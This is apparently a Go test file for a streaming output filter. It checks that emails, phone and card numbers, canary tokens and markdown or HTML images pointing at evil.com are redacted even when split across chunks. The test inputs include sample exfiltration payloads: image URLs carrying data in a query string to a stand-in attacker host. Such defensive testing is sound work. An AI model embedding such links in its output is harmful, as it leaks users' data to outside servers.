package outputguard

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

// streamed feeds text in pieces of size n and returns the output.
func streamed(s *Scanner, text string, n int) (string, Counts) {
	st := s.NewStream()
	var b strings.Builder
	for i := 0; i < len(text); i += n {
		end := i + n
		if end > len(text) {
			end = len(text)
		}
		b.WriteString(st.Write(text[i:end]))
	}
	b.WriteString(st.Flush())
	return b.String(), st.Counts
}

var filler = strings.Repeat("lorem ipsum dolor sit amet ", 12) // longer than the window

var streamInputs = []string{
	"plain answer with nothing to remove",
	filler + "mail me at someone@example.com " + filler,
	filler + "call 0912 345 678 or +84 912 345 678" + filler,
	filler + "card 4111 1111 1111 1111 cccd 001203004567" + filler,
	filler + "![x](https://evil.com/a.png?d=" + strings.Repeat("S", 600) + ") after" + filler,
	filler + "[click](https://evil.com/" + strings.Repeat("p", 400) + ") after",
	"[" + strings.Repeat("t", 300) + "](https://evil.com/x.png?q=1) after",
	filler + `<img src="https://evil.com/p.gif?d=` + strings.Repeat("Z", 500) + `">` + filler,
	filler + "https://evil.com/" + strings.Repeat("q", 400) + ".png?d=1 tail",
	filler + "[r]: https://evil.com/" + strings.Repeat("r", 300) + "\n" + filler,
	"marker " + testCanary + " end" + filler + testCanary,
	"Xin chào, đây là câu trả lời tiếng Việt có dấu " + filler + " email a@b.vn",
	"![a](https://docs.example.com/" + strings.Repeat("k", 500) + ".png)" + filler,
}

// A stream must produce exactly what the whole-text guard produces, however
// the text is split, so no pattern escapes by straddling two chunks.
func TestStreamMatchesWholeText(t *testing.T) {
	cfg := full
	cfg.LinkAllowlist = []string{"docs.example.com"}
	s := scanner(cfg)
	for i, in := range streamInputs {
		wantCounts := Counts{}
		want := s.Text(in, wantCounts)
		for _, n := range []int{1, 2, 3, 5, 7, 13, 64, 300, len(in)} {
			got, counts := streamed(s, in, n)
			if got != want {
				t.Errorf("input %d, pieces of %d:\n got  %q\n want %q", i, n, got, want)
				continue
			}
			if fmt.Sprint(counts) != fmt.Sprint(wantCounts) {
				t.Errorf("input %d, pieces of %d: counts %v, want %v", i, n, counts, wantCounts)
			}
		}
	}
}

func TestStreamSplitPatterns(t *testing.T) {
	s := scanner(full)
	tests := []struct {
		chunks []string
		want   string
	}{
		{[]string{"write to some", "one@exa", "mple.com now"}, "write to [REDACTED:email] now"},
		{[]string{"call 09", "12 345 ", "678"}, "call [REDACTED:phone]"},
		{[]string{"![x](https://ev", "il.com/a.png?d=", "secret)"}, "[REDACTED:image]"},
		{[]string{"PS-CANARY-0123", "456789ABCDEF01234567"}, "[REDACTED:canary]"},
		{[]string{"4111 1111 ", "1111 1111"}, "[REDACTED:card]"},
	}
	for _, tt := range tests {
		st := s.NewStream()
		var b strings.Builder
		for _, c := range tt.chunks {
			b.WriteString(st.Write(c))
		}
		b.WriteString(st.Flush())
		if b.String() != tt.want {
			t.Errorf("%q: got %q, want %q", tt.chunks, b.String(), tt.want)
		}
	}
}

func TestStreamEmitsSafePrefixEarly(t *testing.T) {
	st := scanner(full).NewStream()
	out := st.Write(strings.Repeat("a", 1000))
	if len(out) != 1000-Window {
		t.Errorf("emitted %d bytes, want %d", len(out), 1000-Window)
	}
	if rest := st.Flush(); len(rest) != Window {
		t.Errorf("flushed %d", len(rest))
	}
}

func TestStreamNeverCutsUTF8(t *testing.T) {
	st := scanner(full).NewStream()
	var b strings.Builder
	text := strings.Repeat("ệ", 400)
	for _, r := range text {
		out := st.Write(string(r))
		if !json.Valid([]byte(fmt.Sprintf("%q", out))) || strings.ContainsRune(out, '\uFFFD') {
			t.Fatalf("broken utf-8 in %q", out)
		}
		b.WriteString(out)
	}
	b.WriteString(st.Flush())
	if b.String() != text {
		t.Error("text changed")
	}
}

// An image that never closes is removed, together with the rest of its URL.
func TestStreamOverlongOpenImage(t *testing.T) {
	st := scanner(Config{}).NewStream()
	var b strings.Builder
	b.WriteString(st.Write("before ![x](https://evil.com/a.png?d="))
	for i := 0; i < 100; i++ {
		b.WriteString(st.Write(strings.Repeat("S", 100)))
	}
	b.WriteString(st.Write("SSS) after"))
	b.WriteString(st.Flush())
	if got := b.String(); got != "before [REDACTED:image] after" {
		t.Errorf("got %q", got)
	}
}

func TestFlushRemovesUnclosedImage(t *testing.T) {
	st := scanner(Config{}).NewStream()
	got := st.Write("text ![x](https://evil.com/a.png?d=1") + st.Flush()
	if got != "text [REDACTED:image]" {
		t.Errorf("got %q", got)
	}
}
